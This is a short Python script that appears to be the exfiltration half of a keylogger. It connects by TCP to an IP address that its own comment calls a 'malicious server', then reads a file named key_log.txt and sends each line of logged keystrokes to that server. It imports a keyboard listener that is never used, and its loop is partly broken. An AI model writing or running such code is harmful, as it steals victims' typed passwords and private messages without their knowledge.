import socket
import time as T
import logging
import os
from pynput.keyboard import Key, Listener

# Starting TCP socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Server port and IP
ip = '192.168.8.104'
port = 80

# Connecting to malicious server
s.connect((ip, port))
print("[*] Connected to %s" % ip)

# Start sending keys
keyz = open('key_log.txt', 'r')
while True:
	for line in keyz:
		print(line)
		s.send(line.encode())
